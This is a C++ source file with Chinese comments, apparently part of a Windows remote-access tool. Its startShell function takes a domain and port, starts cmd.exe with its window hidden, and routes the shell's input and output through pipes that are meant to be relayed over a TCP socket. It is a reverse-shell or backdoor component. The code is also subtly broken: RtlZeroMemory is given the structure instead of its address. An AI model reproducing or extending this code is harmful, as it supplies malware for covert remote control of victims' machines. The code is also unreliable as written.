#include "pch.h"
#include "Shell.h"

static Shell gShell; // 初始化类
static TcpSocket gSock; // 传递数据的套接字
// 四个HANDLE 用来创建两个管道
static HANDLE ghReadPipe1, ghWritePipe1, ghReadPipe2, ghWritePipe2;
// 创建命令行进程之后拿到的pi 控制进程
static PROCESS_INFORMATION gPi = { 0 };

Shell::~Shell() {

}

void Shell::startShell(std::string domain, int port) {
	// 创建匿名管道
	SECURITY_ATTRIBUTES securityAttributes = { 0 };
	securityAttributes.bInheritHandle = TRUE;
	securityAttributes.nLength = sizeof(securityAttributes);
	securityAttributes.lpSecurityDescriptor = NULL;
	if ((!::CreatePipe(&ghReadPipe1, &ghWritePipe1, &securityAttributes, 0)) |
		(!::CreatePipe(&ghReadPipe2, &ghWritePipe2, &securityAttributes, 0))) {
		OutputDebugStringA("create pipe failde\r\n");
		return;
	}

	RtlZeroMemory(gPi, sizeof(PROCESS_INFORMATION));
	// 创建cmd进程
	STARTUPINFOA si = { 0 };
	// 隐藏窗口
	si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
	si.wShowWindow = SW_HIDE;
	// 标准输入输出和错误连接至管道
	si.hStdInput = ghReadPipe2;
	si.hStdOutput = si.hStdError = ghWritePipe1;
	// 拼接启动命令行的命令
	CHAR szCmdLine[256] = { 0 };
	GetSystemDirectoryA(szCmdLine, sizeof(szCmdLine));
	StringCchCatA(szCmdLine, _countof(szCmdLine), "\\cmd.exe");
	if (CreateProcessA(szCmdLine, NULL, NULL, NULL, TRUE, 0, NULL, NULL, &si, &gPi) == 0)
	{
		OutputDebugStringA("create cmd process failed\r\n");
		return;
	}
}
